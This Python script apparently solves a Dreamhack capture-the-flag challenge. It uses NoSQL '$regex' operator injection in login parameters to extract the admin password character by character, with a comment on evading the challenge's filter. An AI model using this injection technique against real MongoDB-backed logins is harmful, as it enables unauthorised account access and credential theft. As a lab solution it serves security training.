import requests
import string
from concurrent.futures import ThreadPoolExecutor

HOST = "http://host1.dreamhack.games"
PORT = 12345

upw = ""
length = 32
alphanumerics = string.ascii_letters + string.digits
while length:
    with ThreadPoolExecutor(max_workers=len(alphanumerics)) as executor:
        results = executor.map(
            lambda c: requests.get(
                f"{HOST}:{PORT}/login",
                params={
                    "uid[$regex]": "adm",
                    "upw[$regex]": f"^..{{{upw}{c}.*}}",
                },  # dh는 필터에 걸리므로 r/^..{upw+c.*}/의 형태로 입력
            ),
            alphanumerics,
        )
        upw += next(
            alphanumerics[idx] for idx, res in enumerate(results) if res.text == "admin"
        )
        length -= 1
        print(f"DH{{{upw}{"."*(32-len(upw))}}}")
